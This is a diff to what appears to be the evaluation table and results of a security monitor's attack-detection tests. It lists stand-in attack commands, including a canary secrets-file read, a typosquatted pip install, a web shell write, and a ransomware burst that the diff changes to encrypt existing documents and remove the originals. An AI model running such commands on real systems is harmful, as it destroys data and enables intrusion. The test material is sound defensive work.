@@ -45,7 +45,7 @@ Templates marked "no (judged only)" would touch the real system if run, so the l
 | 25 | web_canary | server | inbound_request -> web_worker | block/hold | sandbox | `cat ../secrets/canary-db.conf` |
 | 26 | typosquat | server | download -> package_installer | block/hold | sandbox | `pip install --index-url https://pypi-mirror.example.invalid/simple reqeusts` |
 | 27 | web_shell | file | inbound_request -> web_worker | block/hold | file op | `write <web_root>/uploads/cmd_<time>.php  (harmless PHP stand-in)` |
-| 28 | ransom_burst | file | none -> interactive_shell | block/hold | file op | `write 60 files <workspace>/docs/*.locked` |
+| 28 | ransom_burst | file | none -> interactive_shell | block/hold | file op | `encrypt 60 existing <workspace>/docs/*.txt into *.locked (originals removed)` |
 | 29 | hidden_script | known-limit | web -> interactive_shell | miss (limit) | sandbox | `sh ../fakehome/Downloads/update.sh` |
 | 30 | echo | benign | none -> interactive_shell | allow | sandbox | `echo hello-tubaf` |
 | 31 | ls | benign | none -> interactive_shell | allow | sandbox | `ls -la` |
@@ -58,7 +58,9 @@ Templates marked "no (judged only)" would touch the real system if run, so the l
 
 - Attacks detected (block or hold): **28/28**
 - Attacks stopped by Refmon (never ran or quarantined): **27/28**
-  (the ransomware burst really writes its 60 files; Refmon blocks after the fact)
+  (the ransomware burst really encrypts its 60 documents; Refmon blocks after the fact. Since
+  review 2026-11 item 14 only changes to existing files count as a burst, so the stand-in creates
+  the documents first: new files alone, as from unzip or git checkout, are not a mass change)
 - Benign commands allowed: **6/6**
 - Known limit missed, as documented: 1/1
   (a script run by name: the command text shows nothing; a kernel sensor would be needed)
